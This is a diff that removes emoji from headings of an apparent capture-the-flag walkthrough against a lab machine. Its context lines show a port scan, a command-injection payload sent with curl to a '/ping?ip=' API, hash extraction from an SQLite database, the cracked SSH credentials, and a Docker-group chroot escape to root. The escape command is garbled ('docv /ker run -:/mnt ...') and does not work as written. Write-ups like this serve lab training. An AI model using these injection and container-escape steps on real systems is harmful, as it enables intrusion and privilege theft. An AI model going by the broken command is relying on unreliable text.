@@ -6,7 +6,7 @@
 
 ---
 
-## 🔍 1. Reconnaissance
+##  1. Reconnaissance
 
 Scan all ports:
 
@@ -22,7 +22,7 @@ nmap -sC -sV -Pn -p- -oN  10.10.10.10
 
 ---
 
-## 🌐 2. Web Enumeration
+##  2. Web Enumeration
 
 ### Port 8081 (Node.js Express API)
 
@@ -51,7 +51,7 @@ Inside `/js`, there is `api.js` which points to `/ping?ip=`.
 
 ---
 
-## 💉 3. Exploiting the API (Command Injection)
+##  3. Exploiting the API (Command Injection)
 
 Test the API:
 
@@ -77,7 +77,7 @@ curl "http://10.10.10.10:8081/ping?ip=`ls -la`"
 
 ---
 
-## 📂 4. Extracting the Database
+##  4. Extracting the Database
 
 Read contents:
 
@@ -89,7 +89,7 @@ The SQLite database contains usernames and hashes.
 
 ---
 
-## 🔑 5. Users and Hashes
+##  5. Users and Hashes
 
 Extracted hashes:
 
@@ -111,7 +111,7 @@ r00t : cyberpunk
 
 ---
 
-## 🖥 6. SSH Access
+##  6. SSH Access
 
 ```bash
 ssh r00t@10.10.10.10
@@ -121,7 +121,7 @@ Password: `cyberpunk`
 
 ---
 
-## 🔼 7. Privilege Check
+##  7. Privilege Check
 
 ```bash
 id
@@ -136,7 +136,7 @@ The user belongs to the **docker** group.
 
 ---
 
-## 🚀 8. Privilege Escalation via Docker
+##  8. Privilege Escalation via Docker
 
 Privilege Escalation
 We will use the GTFOBIN to elevate privileges on the target machine. It tells us that in order to get out of the restricted environment of docker, we need to spawn an interactive shell inside the docker.
@@ -156,11 +156,11 @@ Change root:
 docv /ker run -:/mnt --rm -it bash chroot /mnt sh
 ```
 
-Now we are root 🎉
+Now we are root 
 
 ---
 
-## 📜 9. Summary (Answers)
+##  9. Summary (Answers)
 
 1. Port 8081 → Node.js Express  
 2. Non-standard port → 31331  
